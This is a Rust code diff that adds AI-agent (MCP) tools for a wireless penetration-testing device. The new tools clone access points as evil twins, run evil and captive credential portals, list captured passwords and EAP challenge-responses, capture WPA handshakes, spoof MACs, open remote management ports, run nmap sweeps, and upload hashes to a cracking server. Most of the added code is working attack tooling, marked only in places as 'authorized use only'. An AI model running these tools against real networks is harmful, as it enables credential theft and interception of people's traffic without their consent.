@@ -9,6 +9,7 @@
 
 use crate::bt;
 use crate::device;
+use crate::intel;
 use crate::recon;
 use serde_json::{json, Value};
 use std::path::PathBuf;
@@ -189,6 +190,156 @@ impl Server {
                 "type":"object",
                 "properties":{"action":{"type":"string","enum":["on","off"]}},
                 "required":["action"],
+                "additionalProperties":false
+            })),
+            // ---- structured intel (read-only) ----
+            tool("connected_clients", "List stations associated to the Pager's OWN hostapd APs (from the recon hostap_client table): client MAC, the AP SSID they joined, connect/disconnect times and whether still connected.", json!({
+                "type":"object",
+                "properties":{"limit":{"type":"integer","minimum":1,"maximum":1000,"description":"Max rows (default 200)."}},
+                "additionalProperties":false
+            })),
+            tool("probes", "Probe-request SSIDs from the recon database. action='list' shows each probed SSID with the client MAC probing for it; action='top' ranks SSIDs by number of distinct devices probing (networks named by >1 device).", json!({
+                "type":"object",
+                "properties":{
+                    "action":{"type":"string","enum":["list","top"],"description":"'list' (raw) or 'top' (ranked). Default top."},
+                    "limit":{"type":"integer","minimum":1,"maximum":1000,"description":"Max rows (default 100)."}
+                },
+                "additionalProperties":false
+            })),
+            tool("captured_credentials", "Credentials captured on this engagement: captive/evil-portal credential logs from loot (goodportal), plus WPA-Enterprise EAP identities/passwords and MSCHAPv2 challenge-responses from the recon database.", json!({"type":"object","properties":{},"additionalProperties":false})),
+            tool("handshake_quality", "Classify and dedupe captured WPA handshakes in loot: counts capture files, unique handshakes (by MIC/PMKID), PMKID vs EAPOL hashlines, files with no crackable material, and a per-ESSID breakdown.", json!({"type":"object","properties":{},"additionalProperties":false})),
+            tool("find_suspicious", "Heuristic threat sweep across Bluetooth (blue5) and Wi-Fi (recon) data: Flipper Zero devices, Flock Safety surveillance gear, Bluetooth skimmer modules, SSID-spoofing APs, and rogue Pineapple/Pager beacons. Community signatures — corroborate before acting.", json!({"type":"object","properties":{},"additionalProperties":false})),
+            // ---- PineAP / evil-twin device commands ----
+            tool("ssid_pool", "Manage the PineAP SSID pool (the beacon list the Open AP advertises). Actions: add/add_file/delete/clear/list/collect_start/collect_stop (auto-collect probed SSIDs)/start/stop. start needs the Open AP enabled and mimic on.", json!({
+                "type":"object",
+                "properties":{
+                    "action":{"type":"string","enum":["add","add_file","delete","clear","list","collect_start","collect_stop","start","stop"]},
+                    "ssids":{"type":"array","items":{"type":"string"},"description":"SSIDs for add/delete."},
+                    "file":{"type":"string","description":"Path to a file with one SSID per line (add_file)."},
+                    "randomize":{"type":"boolean","description":"start only: true = random BSSID per SSID, false = Open AP BSSID (default)."}
+                },
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            tool("mimic", "Enable or disable PineAP 'mimic' mode (accept connections for pooled/mimicked SSIDs on the Open AP). Required before ssid_pool start.", json!({
+                "type":"object",
+                "properties":{"action":{"type":"string","enum":["enable","disable"]}},
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            tool("clone_ap", "Clone a target AP's SSID (and optionally BSSID) into the persistent Open AP (wlan0open) via UCI, then reload Wi-Fi. action='restore' removes the BSSID override. Pass ssid/bssid from recon.", json!({
+                "type":"object",
+                "properties":{
+                    "action":{"type":"string","enum":["clone","restore"]},
+                    "ssid":{"type":"string","description":"SSID to clone (clone)."},
+                    "bssid":{"type":"string","description":"Optional BSSID to spoof on the Open AP (clone)."},
+                    "add_to_pool":{"type":"boolean","description":"Also add the SSID to the PineAP pool."}
+                },
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            // ---- GPS / WiGLE / wardriving ----
+            tool("gps", "Native GPS control. action='list' lists attached USB-serial GPS devices; 'configure' sets the GPSd serial device + baud; 'get' returns the current position/fix.", json!({
+                "type":"object",
+                "properties":{
+                    "action":{"type":"string","enum":["list","configure","get"]},
+                    "device":{"type":"string","description":"GPS device path/id from gps list (configure)."},
+                    "baud":{"type":"integer","description":"Baud rate, e.g. 4800/9600/115200 (configure)."}
+                },
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            tool("wifi_wigle", "Wi-Fi WiGLE logging (distinct from bt_wigle). Actions: login(username,password)/logout/start(returns log file)/stop/upload(files, optional archive/remove). Logs land in loot/wigle; need a GPS fix to populate.", json!({
+                "type":"object",
+                "properties":{
+                    "action":{"type":"string","enum":["login","logout","start","stop","upload"]},
+                    "username":{"type":"string"},
+                    "password":{"type":"string"},
+                    "files":{"type":"array","items":{"type":"string"},"description":"Files to upload (upload)."},
+                    "archive":{"type":"boolean","description":"upload: move uploaded files to loot/archive/wigle."},
+                    "remove":{"type":"boolean","description":"upload: delete uploaded files after upload."}
+                },
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            tool("wardrive", "Start or stop a wardrive: configure GPS (optional), restart gpsd and start Wi-Fi WiGLE logging; stop closes the WiGLE log. Needs a physical GPS with sky view to populate.", json!({
+                "type":"object",
+                "properties":{
+                    "action":{"type":"string","enum":["start","stop"]},
+                    "device":{"type":"string","description":"GPS device from gps list (start; optional, else uses current)."},
+                    "baud":{"type":"integer","description":"GPS baud (start; default 9600)."},
+                    "mode":{"type":"string","enum":["GPSD","PINEAP"],"description":"GPS mode (start; default GPSD)."}
+                },
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            // ---- portals ----
+            tool("evil_portal", "Control Evil Portal (captive portal). Actions: status/list (show installed portals + active one), start/stop/enable/disable, switch(name). Errors cleanly if Evil Portal isn't installed.", json!({
+                "type":"object",
+                "properties":{
+                    "action":{"type":"string","enum":["status","list","start","stop","enable","disable","switch"]},
+                    "name":{"type":"string","description":"Portal name to activate (switch)."}
+                },
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            tool("captive_portal", "Manage the nginx-based goodportal captive portal. action='status' (nginx + portal state), 'list' (portals under /www/goodportal), 'remove' (tear down nginx/firewall/monitor and restore config). Captured creds appear in captured_credentials.", json!({
+                "type":"object",
+                "properties":{"action":{"type":"string","enum":["status","list","remove"]}},
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            // ---- device / network ops ----
+            tool("mac_spoof", "Change or restore a network interface's MAC. action='set' (interface+mac, optional hostname), 'restore' (back to the permanent MAC via ethtool), 'show' (current MAC). Brings the interface down/up.", json!({
+                "type":"object",
+                "properties":{
+                    "action":{"type":"string","enum":["set","restore","show"]},
+                    "interface":{"type":"string","description":"Interface, e.g. wlan0cli, eth0."},
+                    "mac":{"type":"string","description":"New MAC (set)."},
+                    "hostname":{"type":"string","description":"Optional hostname to set with the MAC (set)."}
+                },
+                "required":["action","interface"],
+                "additionalProperties":false
+            })),
+            tool("mgmt_access", "Toggle management access (SSH:22 + Web UI:1471) from the Client Wi-Fi (wan zone) via a UCI firewall rule. action='status'/'open'/'lock'. Restarts the firewall.", json!({
+                "type":"object",
+                "properties":{"action":{"type":"string","enum":["status","open","lock"]}},
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            // ---- active scanning / capture / exfil ----
+            tool("nmap_scan", "Run nmap and save results to loot. scan='discovery' (ping sweep), 'subnet' (fast SYN top-100), 'smb' (port 445 sweep). target is an IP/CIDR. Active/networked — authorized engagements only.", json!({
+                "type":"object",
+                "properties":{
+                    "scan":{"type":"string","enum":["discovery","subnet","smb"]},
+                    "target":{"type":"string","description":"IP or CIDR, e.g. 172.16.52.0/24."}
+                },
+                "required":["scan","target"],
+                "additionalProperties":false
+            })),
+            tool("hcx_capture", "hcxdumptool PMKID/EAPOL capture (alternative to the recon engine). action='status'/'start'/'stop'. NOTE: hcxdumptool may not be installed; start reports that. Prefer pcap_control/handshakes for native capture.", json!({
+                "type":"object",
+                "properties":{
+                    "action":{"type":"string","enum":["status","start","stop"]},
+                    "interface":{"type":"string","description":"Monitor interface (start; default wlan1mon)."}
+                },
+                "required":["action"],
+                "additionalProperties":false
+            })),
+            tool("usb_export", "Mount the first attached USB partition, copy /root/loot to it (timestamped dir), sync, and lazy-unmount. Needs a USB drive with a supported filesystem.", json!({"type":"object","properties":{},"additionalProperties":false})),
+            tool("hashtopolis_upload", "Upload a hashcat-22000 file to a Hashtopolis server (legacy JSON API): create a hashlist and run a pretask. Networked upload of captured hashes — authorized use only.", json!({
+                "type":"object",
+                "properties":{
+                    "hashcat_file":{"type":"string","description":"Path to the .22000 hashcat file to upload."},
+                    "url":{"type":"string","description":"Hashtopolis API endpoint, e.g. http://host/api/user.php."},
+                    "api_key":{"type":"string","description":"Hashtopolis access key / voucher."},
+                    "pretask_id":{"type":"integer"},
+                    "cracker_version_id":{"type":"integer"},
+                    "hash_type":{"type":"integer","description":"Hashcat mode (default 22000)."},
+                    "access_group_id":{"type":"integer","description":"Access group id (default 1)."},
+                    "name":{"type":"string","description":"Optional hashlist/task name."}
+                },
+                "required":["hashcat_file","url","api_key","pretask_id","cracker_version_id"],
                 "additionalProperties":false
             })),
         ];
@@ -431,6 +582,316 @@ impl Server {
                 device::run_cmd("blue5ctl", &["wigle".to_string(), action])
             }
 
+            // ---- structured intel (read-only) ----
+            "connected_clients" => {
+                let limit = args.get("limit").and_then(Value::as_i64).unwrap_or(200);
+                intel::connected_clients(limit)
+            }
+            "probes" => {
+                let action = opt_str(args, "action").unwrap_or_else(|| "top".to_string());
+                let limit = args.get("limit").and_then(Value::as_i64).unwrap_or(100);
+                intel::probes(&action, limit)
+            }
+            "captured_credentials" => intel::captured_credentials(&self.loot_dir, self.read_cap),
+            "handshake_quality" => intel::handshake_quality(&self.loot_dir),
+            "find_suspicious" => intel::find_suspicious(),
+
+            // ---- PineAP / evil-twin device commands ----
+            "ssid_pool" => match enum_arg(
+                args,
+                "action",
+                &["add", "add_file", "delete", "clear", "list", "collect_start", "collect_stop", "start", "stop"],
+            )?
+            .as_str()
+            {
+                "add" => {
+                    let s = str_array(args, "ssids")?;
+                    if s.is_empty() {
+                        return Err("ssids must contain at least one SSID".to_string());
+                    }
+                    device::run_cmd("PINEAPPLE_SSID_POOL_ADD", &s)
+                }
+                "add_file" => device::run_cmd("PINEAPPLE_SSID_POOL_ADD_FILE", &[req_str(args, "file")?]),
+                "delete" => {
+                    let s = str_array(args, "ssids")?;
+                    if s.is_empty() {
+                        return Err("ssids must contain at least one SSID".to_string());
+                    }
+                    device::run_cmd("PINEAPPLE_SSID_POOL_DELETE", &s)
+                }
+                "clear" => device::run_cmd("PINEAPPLE_SSID_POOL_CLEAR", &[]),
+                "list" => device::run_cmd("PINEAPPLE_SSID_POOL_LIST", &[]),
+                "collect_start" => device::run_cmd("PINEAPPLE_SSID_POOL_COLLECT_START", &[]),
+                "collect_stop" => device::run_cmd("PINEAPPLE_SSID_POOL_COLLECT_STOP", &[]),
+                "start" => {
+                    let mut a = Vec::new();
+                    if let Some(r) = args.get("randomize").and_then(Value::as_bool) {
+                        a.push(if r { "true" } else { "false" }.to_string());
+                    }
+                    device::run_cmd("PINEAPPLE_SSID_POOL_START", &a)
+                }
+                _ => device::run_cmd("PINEAPPLE_SSID_POOL_STOP", &[]),
+            },
+            "mimic" => match enum_arg(args, "action", &["enable", "disable"])?.as_str() {
+                "enable" => device::run_cmd("PINEAPPLE_MIMIC_ENABLE", &[]),
+                _ => device::run_cmd("PINEAPPLE_MIMIC_DISABLE", &[]),
+            },
+            "clone_ap" => match enum_arg(args, "action", &["clone", "restore"])?.as_str() {
+                "clone" => {
+                    let ssid = req_str(args, "ssid")?;
+                    let mut steps: Vec<(&str, Vec<String>)> = vec![(
+                        "uci",
+                        vec!["set".to_string(), format!("wireless.wlan0open.ssid={ssid}")],
+                    )];
+                    if let Some(b) = opt_str(args, "bssid").filter(|b| !b.is_empty()) {
+                        let mac = norm_mac(&b).ok_or("bssid must be a MAC address")?;
+                        steps.push(("uci", vec!["set".to_string(), format!("wireless.wlan0open.macaddr={mac}")]));
+                    }
+                    steps.push(("uci", vec!["set".to_string(), "wireless.wlan0open.disabled=0".to_string()]));
+                    steps.push(("uci", vec!["commit".to_string(), "wireless".to_string()]));
+                    steps.push(("wifi", vec!["reload".to_string()]));
+                    let mut out = run_steps(&steps)?;
+                    if args.get("add_to_pool").and_then(Value::as_bool).unwrap_or(false) {
+                        let p = device::run_cmd("PINEAPPLE_SSID_POOL_ADD", &[ssid.clone()]).unwrap_or_else(|e| e);
+                        out.push_str(&format!("\npool: {p}"));
+                    }
+                    Ok(out)
+                }
+                _ => run_steps(&[
+                    ("uci", vec!["delete".to_string(), "wireless.wlan0open.macaddr".to_string()]),
+                    ("uci", vec!["commit".to_string(), "wireless".to_string()]),
+                    ("wifi", vec!["reload".to_string()]),
+                ]),
+            },
+
+            // ---- GPS / WiGLE / wardriving ----
+            "gps" => match enum_arg(args, "action", &["list", "configure", "get"])?.as_str() {
+                "list" => device::run_cmd("GPS_LIST", &[]),
+                "get" => device::run_cmd("GPS_GET", &[]),
+                _ => {
+                    let dev = req_str(args, "device")?;
+                    let baud = num_arg(args, "baud")?;
+                    device::run_cmd("GPS_CONFIGURE", &[dev, baud])
+                }
+            },
+            "wifi_wigle" => match enum_arg(args, "action", &["login", "logout", "start", "stop", "upload"])?.as_str() {
+                "login" => device::run_cmd("WIGLE_LOGIN", &[req_str(args, "username")?, req_str(args, "password")?]),
+                "logout" => device::run_cmd("WIGLE_LOGOUT", &[]),
+                "start" => device::run_cmd("WIGLE_START", &[]),
+                "stop" => device::run_cmd("WIGLE_STOP", &[]),
+                _ => {
+                    let mut a = Vec::new();
+                    if args.get("archive").and_then(Value::as_bool).unwrap_or(false) {
+                        a.push("--archive".to_string());
+                    }
+                    if args.get("remove").and_then(Value::as_bool).unwrap_or(false) {
+                        a.push("--remove".to_string());
+                    }
+                    let files = str_array(args, "files")?;
+                    if files.is_empty() {
+                        return Err("files must contain at least one path for upload".to_string());
+                    }
+                    a.extend(files);
+                    device::run_cmd("WIGLE_UPLOAD", &a)
+                }
+            },
+            "wardrive" => match enum_arg(args, "action", &["start", "stop"])?.as_str() {
+                "start" => {
+                    let mut out = String::new();
+                    if let Some(dev) = opt_str(args, "device").filter(|d| !d.is_empty()) {
+                        let baud = opt_num_str(args, "baud").unwrap_or_else(|| "9600".to_string());
+                        let mode = enum_arg_default(args, "mode", &["GPSD", "PINEAP"], "GPSD")?;
+                        out.push_str(&device::run_cmd("GPS_CONFIGURE", &[mode, dev, baud]).unwrap_or_else(|e| e));
+                        out.push('\n');
+                        let _ = device::run_cmd("/etc/init.d/gpsd", &["restart".to_string()]);
+                    }
+                    let w = device::run_cmd("WIGLE_START", &[])?;
+                    Ok(format!("{out}WiGLE log: {w}"))
+                }
+                _ => device::run_cmd("WIGLE_STOP", &[]),
+            },
+
+            // ---- portals ----
+            "evil_portal" => {
+                let initd = "/etc/init.d/evilportal";
+                if !std::path::Path::new(initd).exists() {
+                    return Err("Evil Portal is not installed (no /etc/init.d/evilportal). Install the evil_portal payload first.".to_string());
+                }
+                match enum_arg(args, "action", &["status", "list", "start", "stop", "enable", "disable", "switch"])?.as_str() {
+                    "status" | "list" => Ok(list_portals("/root/portals")),
+                    "switch" => {
+                        let name = valid_name(&req_str(args, "name")?)?;
+                        device::run_cmd(initd, &["switch".to_string(), name])
+                    }
+                    a => device::run_cmd(initd, &[a.to_string()]),
+                }
+            }
+            "captive_portal" => match enum_arg(args, "action", &["status", "list", "remove"])?.as_str() {
+                "list" => Ok(list_portals("/www/goodportal")),
+                "status" => device::run_bash(
+                    "echo nginx:; pgrep -a nginx || echo '  (not running)'; \
+                     echo portals:; ls -1 /www/goodportal 2>/dev/null || echo '  (none)'; \
+                     echo whitelist_monitor:; [ -f /tmp/goodportal-whitelist.pid ] && echo '  pid '$(cat /tmp/goodportal-whitelist.pid) || echo '  (not running)'; \
+                     echo configured:; [ -f /etc/nginx/nginx.conf.goodportal.bak ] && echo '  yes (backup present)' || echo '  no'",
+                ),
+                _ => device::run_bash(
+                    "set +e; \
+                     for pf in /tmp/goodportal-whitelist.pid /tmp/goodportal-dns.pid; do [ -f \"$pf\" ] && kill \"$(cat \"$pf\")\" 2>/dev/null; rm -f \"$pf\"; done; \
+                     /etc/init.d/nginx stop 2>/dev/null; /etc/init.d/php8-fpm stop 2>/dev/null; \
+                     while idx=$(uci show firewall | grep -i goodportal | head -n1 | sed -n 's/^firewall.@redirect\\[\\([0-9]*\\)\\].*/\\1/p'); [ -n \"$idx\" ]; do uci delete firewall.@redirect[$idx]; done; \
+                     uci commit firewall; \
+                     [ -f /etc/nginx/nginx.conf.goodportal.bak ] && cp /etc/nginx/nginx.conf.goodportal.bak /etc/nginx/nginx.conf; \
+                     uci set nginx.global.uci_enable=true 2>/dev/null; uci commit nginx 2>/dev/null; \
+                     /etc/init.d/firewall restart 2>/dev/null; \
+                     rm -f /tmp/goodportal_*; echo 'goodportal removed'",
+                ),
+            },
+
+            // ---- device / network ops ----
+            "mac_spoof" => {
+                let iface = valid_iface(&req_str(args, "interface")?)?;
+                match enum_arg(args, "action", &["set", "restore", "show"])?.as_str() {
+                    "show" => device::run_cmd("cat", &[format!("/sys/class/net/{iface}/address")]),
+                    "set" => {
+                        let mac = norm_mac(&req_str(args, "mac")?).ok_or("mac must be a MAC address")?;
+                        let mut out = run_steps(&[
+                            ("ifconfig", vec![iface.clone(), "down".to_string()]),
+                            ("ifconfig", vec![iface.clone(), "hw".to_string(), "ether".to_string(), mac.clone()]),
+                            ("ifconfig", vec![iface.clone(), "up".to_string()]),
+                        ])?;
+                        if let Some(h) = opt_str(args, "hostname").filter(|h| !h.is_empty()) {
+                            let h = valid_name(&h)?;
+                            let _ = device::run_cmd("hostname", &[h.clone()]);
+                            out.push_str(&format!("\nhostname set to {h}"));
+                        }
+                        Ok(out)
+                    }
+                    _ => {
+                        let perm = device::run_cmd("ethtool", &["-P".to_string(), iface.clone()])?;
+                        let mac = perm
+                            .split_whitespace()
+                            .last()
+                            .and_then(norm_mac)
+                            .ok_or("could not read permanent MAC via ethtool -P")?;
+                        run_steps(&[
+                            ("ifconfig", vec![iface.clone(), "down".to_string()]),
+                            ("ifconfig", vec![iface.clone(), "hw".to_string(), "ether".to_string(), mac.clone()]),
+                            ("ifconfig", vec![iface.clone(), "up".to_string()]),
+                        ])
+                    }
+                }
+            }
+            "mgmt_access" => match enum_arg(args, "action", &["status", "open", "lock"])?.as_str() {
+                "status" => {
+                    let s = device::run_cmd("uci", &["get".to_string(), "firewall.dev_access_rule.enabled".to_string()])
+                        .unwrap_or_else(|_| "absent (locked)".to_string());
+                    let ip = device::run_cmd("ip", &["-4".to_string(), "addr".to_string(), "show".to_string(), "wlan0cli".to_string()])
+                        .unwrap_or_default();
+                    Ok(format!("dev_access_rule.enabled = {}\n{ip}", s.trim()))
+                }
+                "open" => run_steps(&[
+                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule=rule".to_string()]),
+                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.name=Allow-Dev-Access".to_string()]),
+                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.src=wan".to_string()]),
+                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.dest_port=22 1471".to_string()]),
+                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.proto=tcp".to_string()]),
+                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.target=ACCEPT".to_string()]),
+                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.enabled=1".to_string()]),
+                    ("uci", vec!["reorder".to_string(), "firewall.dev_access_rule=0".to_string()]),
+                    ("uci", vec!["commit".to_string(), "firewall".to_string()]),
+                    ("fw4", vec!["restart".to_string()]),
+                ]),
+                _ => run_steps(&[
+                    ("uci", vec!["delete".to_string(), "firewall.dev_access_rule".to_string()]),
+                    ("uci", vec!["commit".to_string(), "firewall".to_string()]),
+                    ("fw4", vec!["restart".to_string()]),
+                ]),
+            },
+
+            // ---- active scanning / capture / exfil ----
+            "nmap_scan" => {
+                let target = req_cidr(args, "target")?;
+                let scan = enum_arg(args, "scan", &["discovery", "subnet", "smb"])?;
+                let (subdir, mut flags): (&str, Vec<String>) = match scan.as_str() {
+                    "discovery" => ("nmapHostDiscovery", ["-sn", "-PE", "-PP", "-PS", "-PA"].iter().map(|s| s.to_string()).collect()),
+                    "subnet" => ("nmapTarget", ["-Pn", "-sS", "-F"].iter().map(|s| s.to_string()).collect()),
+                    _ => ("smb_discovery", ["-p", "445", "-n"].iter().map(|s| s.to_string()).collect()),
+                };
+                let dir = self.loot_dir.join(subdir);
+                let _ = std::fs::create_dir_all(&dir);
+                let ts = now_secs();
+                if scan == "smb" {
+                    flags.push(target.clone());
+                    let out = device::run_cmd("nmap", &flags)?;
+                    let f = dir.join(format!("smb_{ts}.txt"));
+                    let _ = std::fs::write(&f, &out);
+                    Ok(format!("{out}\n\n(saved: {})", f.display()))
+                } else {
+                    let base = dir.join(ts.to_string());
+                    flags.push("-oA".to_string());
+                    flags.push(base.display().to_string());
+                    flags.push(target.clone());
+                    let out = device::run_cmd("nmap", &flags)?;
+                    Ok(format!("{out}\n\n(saved: {}.nmap/.gnmap/.xml)", base.display()))
+                }
+            }
+            "hcx_capture" => {
+                let installed = device::run_cmd("which", &["hcxdumptool".to_string()]).is_ok();
+                match enum_arg(args, "action", &["status", "start", "stop"])?.as_str() {
+                    "status" => {
+                        let run = device::run_cmd("pgrep", &["-a".to_string(), "hcxdumptool".to_string()])
+                            .unwrap_or_else(|_| "(not running)".to_string());
+                        Ok(format!("hcxdumptool installed: {installed}\nrunning: {run}"))
+                    }
+                    "start" => {
+                        if !installed {
+                            return Err("hcxdumptool is not installed. Install it (opkg update && opkg install hcxdumptool hcxtools) or use pcap_control/handshakes for native recon capture.".to_string());
+                        }
+                        let iface = valid_iface(&opt_str(args, "interface").unwrap_or_else(|| "wlan1mon".to_string()))?;
+                        let ts = now_secs();
+                        let _ = device::run_cmd("mkdir", &["-p".to_string(), "/root/loot/handshakes".to_string()]);
+                        device::run_bash(&format!(
+                            "hcxdumptool -i {iface} -w /root/loot/handshakes/capture_{ts}.pcapng >/dev/null 2>&1 & echo started hcxdumptool pid $! -> capture_{ts}.pcapng"
+                        ))
+                    }
+                    _ => device::run_cmd("pkill", &["-2".to_string(), "hcxdumptool".to_string()]),
+                }
+            }
+            "usb_export" => device::run_bash(
+                "set +e; DEV=''; \
+                 for p in /dev/sda1 /dev/sdb1 /dev/sdc1 /dev/sdd1 $(ls /dev/sd[a-z][0-9] 2>/dev/null); do [ -b \"$p\" ] && { DEV=\"$p\"; break; }; done; \
+                 [ -z \"$DEV\" ] && { echo 'no USB partition found'; exit 1; }; \
+                 MP=/mnt/usb; mkdir -p \"$MP\"; grep -q \" $MP \" /proc/mounts || mount \"$DEV\" \"$MP\" || { echo \"mount $DEV failed\"; exit 1; }; \
+                 DEST=\"$MP/pager-loot-$(date +%Y%m%d_%H%M%S)\"; mkdir -p \"$DEST\"; \
+                 cp -a /root/loot/. \"$DEST\"/ 2>/dev/null || cp -r /root/loot/* \"$DEST\"/ 2>/dev/null; sync; \
+                 echo \"copied /root/loot -> $DEST on $DEV\"; cd /; umount -l \"$MP\" 2>/dev/null; echo 'unmounted (lazy)'",
+            ),
+            "hashtopolis_upload" => {
+                let file = req_str(args, "hashcat_file")?;
+                let url = req_str(args, "url")?;
+                let key = req_str(args, "api_key")?;
+                let pretask = num_arg(args, "pretask_id")?;
+                let crackerver = num_arg(args, "cracker_version_id")?;
+                let htype = opt_num_str(args, "hash_type").unwrap_or_else(|| "22000".to_string());
+                let agid = opt_num_str(args, "access_group_id").unwrap_or_else(|| "1".to_string());
+                let name = opt_str(args, "name").filter(|n| !n.is_empty()).unwrap_or_else(|| "mcp-pager-upload".to_string());
+                // Values are passed as positional args ($1..$8), never interpolated into the script.
+                let script = r#"url="$1"; key="$2"; file="$3"; pretask="$4"; cver="$5"; htype="$6"; agid="$7"; name="$8"
+[ -f "$file" ] || { echo "file not found: $file"; exit 1; }
+data=$(base64 -w0 "$file") || { echo "base64 failed"; exit 1; }
+body=$(jq -n --arg n "$name" --argjson ht "$htype" --argjson ag "$agid" --arg d "$data" --arg k "$key" '{section:"hashlist",request:"createHashlist",name:$n,isSalted:false,isSecret:false,isHexSalt:false,separator:":",format:0,hashtypeId:$ht,accessGroupId:$ag,data:$d,useBrain:false,brainFeatures:0,accessKey:$k}')
+resp=$(curl -s -m 30 -X POST "$url" -H 'Content-Type: application/json' -d "$body")
+echo "createHashlist: $resp"
+hlid=$(echo "$resp" | jq -r '.hashlistId // empty')
+[ -z "$hlid" ] && { echo "no hashlistId returned; aborting"; exit 1; }
+rbody=$(jq -n --arg n "$name" --argjson hl "$hlid" --argjson pt "$pretask" --argjson cv "$cver" --arg k "$key" '{section:"task",request:"runPretask",name:$n,hashlistId:$hl,pretaskId:$pt,crackerVersionId:$cv,accessKey:$k}')
+echo "runPretask: $(curl -s -m 30 -X POST "$url" -H 'Content-Type: application/json' -d "$rbody")""#;
+                device::run_cmd(
+                    "bash",
+                    &["-c".to_string(), script.to_string(), "bash".to_string(), url, key, file, pretask, crackerver, htype, agid, name],
+                )
+            }
+
             // ---- full device control + active RF ----
             "bash" => {
                 let cmd = req_str(args, "command")?;
@@ -633,6 +1094,96 @@ fn is_mac(s: &str) -> bool {
 
 fn is_num(s: &str) -> bool {
     !s.is_empty() && s.bytes().all(|b| b.is_ascii_digit())
+}
+
+/// Run a sequence of exec commands, aggregating output; stop on the first error.
+/// Values are passed as argv (never a shell), so caller input is not interpreted.
+fn run_steps(steps: &[(&str, Vec<String>)]) -> Result<String, String> {
+    let mut out = String::new();
+    for (cmd, a) in steps {
+        match device::run_cmd(cmd, a) {
+            Ok(o) => {
+                if !o.trim().is_empty() && o != "(ok)" {
+                    out.push_str(&o);
+                    out.push('\n');
+                }
+            }
+            Err(e) => return Err(format!("{}\nstep `{cmd}` failed: {e}", out.trim_end())),
+        }
+    }
+    Ok(if out.trim().is_empty() { "(ok)".to_string() } else { out.trim_end().to_string() })
+}
+
+/// Like `enum_arg` but returns `default` when the key is absent.
+fn enum_arg_default(args: &Value, key: &str, allowed: &[&str], default: &str) -> Result<String, String> {
+    match args.get(key) {
+        None | Some(Value::Null) => Ok(default.to_string()),
+        _ => enum_arg(args, key, allowed),
+    }
+}
+
+/// Validate a network interface name (conservative charset).
+fn valid_iface(s: &str) -> Result<String, String> {
+    if !s.is_empty() && s.len() <= 20 && s.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-')) {
+        Ok(s.to_string())
+    } else {
+        Err(format!("invalid interface name: {s}"))
+    }
+}
+
+/// Validate a portal/host name (alphanumerics, space, `.`/`_`/`-`).
+fn valid_name(s: &str) -> Result<String, String> {
+    if !s.is_empty() && s.len() <= 64 && s.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b' ' | b'.' | b'_' | b'-')) {
+        Ok(s.to_string())
+    } else {
+        Err(format!("invalid name (allowed: letters, digits, space, . _ -): {s}"))
+    }
+}
+
+/// Required IP/CIDR target: restrict to hex digits, dots, colons and `/`.
+fn req_cidr(args: &Value, key: &str) -> Result<String, String> {
+    let s = req_str(args, key)?;
+    if !s.is_empty() && s.len() <= 64 && s.bytes().all(|b| b.is_ascii_hexdigit() || matches!(b, b'.' | b':' | b'/')) {
+        Ok(s)
+    } else {
+        Err(format!("invalid target (expected an IP or CIDR like 172.16.52.0/24): {s}"))
+    }
+}
+
+fn now_secs() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0)
+}
+
+/// List portal subdirectories under `base`, marking the active one (the target
+/// of a `current` symlink, if present). Returns pretty JSON.
+fn list_portals(base: &str) -> String {
+    let dir = std::path::Path::new(base);
+    let active = std::fs::read_link(dir.join("current"))
+        .ok()
+        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()));
+    let mut portals = Vec::new();
+    if let Ok(rd) = std::fs::read_dir(dir) {
+        for ent in rd.flatten() {
+            let name = ent.file_name().to_string_lossy().into_owned();
+            if name == "current" {
+                continue;
+            }
+            if ent.file_type().map(|t| t.is_dir()).unwrap_or(false) {
+                portals.push(name);
+            }
+        }
+    }
+    portals.sort();
+    let exists = dir.exists();
+    pretty(&json!({
+        "dir": base,
+        "installed": exists,
+        "active": active,
+        "portals": portals,
+    }))
 }
 
 /// Parse a Bluetooth SIG company id given as decimal ("76") or hex ("0x004C").
